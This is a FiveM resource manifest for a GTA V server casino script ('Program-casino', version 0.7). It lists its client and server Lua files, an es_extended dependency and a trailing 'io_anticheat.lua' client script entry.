fx_version 'adamant'
game 'gta5'

description 'Program-casino'

version '0.7'

client_scripts {
    'config.lua',
    'client/main.lua',
    'client/functions.lua',
}
server_scripts {
    'config.lua',
    'server/main.lua',
    'server/functions.lua',
}

dependencies {
	'es_extended'
}
client_script "io_anticheat.lua"